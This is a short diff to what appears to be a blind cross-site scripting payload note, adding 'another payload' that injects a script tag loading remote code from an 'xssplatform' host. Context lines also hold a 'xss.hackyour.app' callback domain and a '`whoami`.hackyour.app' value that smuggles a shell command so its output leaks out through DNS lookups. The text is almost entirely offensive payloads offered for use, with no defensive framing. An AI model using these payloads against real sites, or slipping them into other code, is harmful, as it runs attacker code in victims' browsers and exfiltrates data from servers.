@@ -39,5 +39,10 @@ Encoder:https://www.w3schools.com/jsref/met_win_atob.asp
 <br>
 Thanks to:https://ardern.io/2017/12/10/blind-xss/
 
+<br>
+<br>
+another payload:
+s=createElement('script');body.appendChild(s);s.src='https://xssplatform?'+Math.random()
+
 https://xss.hackyour.app/ <br>
 \`whoami\`.hackyour.app
